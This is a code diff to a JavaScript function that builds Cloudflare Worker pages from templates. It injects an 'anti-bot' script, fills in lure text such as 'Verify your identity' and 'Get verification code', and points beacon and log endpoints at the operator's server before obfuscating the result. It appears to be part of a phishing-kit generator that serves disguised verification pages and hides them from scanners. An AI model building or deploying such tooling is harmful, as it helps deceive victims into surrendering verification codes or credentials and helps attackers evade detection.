@@ -22,9 +22,25 @@ function buildWorkerScript(link, user) {
   const templateCSS = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
   let templateJS = loadTemplateJS(templateType);
 
+  // Load vg-engine.js for anti-bot and verification logic
+  let vgEngine = '';
+  const vgEnginePath = path.join(__dirname, '..', 'templates', 'assets', 'vg-engine.js');
+  if (fs.existsSync(vgEnginePath)) {
+    vgEngine = fs.readFileSync(vgEnginePath, 'utf8');
+  }
+
   // Replace template placeholders
   templateHTML = templateHTML
-    .replace('{{CSS}}', templateCSS)
+    .replace('/* {{CSS}} */', '<style>' + templateCSS + '</style>')
+    .replace('// {{SCRIPT}}', '<script>' + templateJS + '</script>');
+
+  // Inject vg-engine.js before closing </head>
+  if (vgEngine && templateHTML.includes('</head>')) {
+    templateHTML = templateHTML.replace('</head>', '<script>' + vgEngine + '</script></head>');
+  }
+
+  // Replace remaining placeholders
+  templateHTML = templateHTML
     .replace('{{TITLE}}', link.title_text || 'Verify your identity')
     .replace('{{MESSAGE}}', link.message_text || 'Please verify your identity to continue')
     .replace('{{BUTTON_TEXT}}', link.button_text || 'Get verification code')
@@ -67,7 +83,7 @@ function buildWorkerScript(link, user) {
     .replace("'{{BEACON_ENDPOINT}}'", `'${serverUrl}'`)
     .replace("'{{LOG_ENDPOINT}}'", `'${serverUrl}'`)
     .replace("'{{TURNSTILE_SECRET}}'", `'${config.CF_TURNSTILE_SECRET_KEY}'`)
-    .replace("'{{TEMPLATE_HTML}}'", `\`${templateHTML}\``)
+    .replace("'{{TEMPLATE_HTML}}'", "'" + templateHTML.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/\n/g, '\\n').replace(/\r/g, '') + "'")
     .replace("'{{USER_DATA}}'", safeUserJson);
 
   // Obfuscate if enabled - SAFE obfuscation profile for Cloudflare Workers
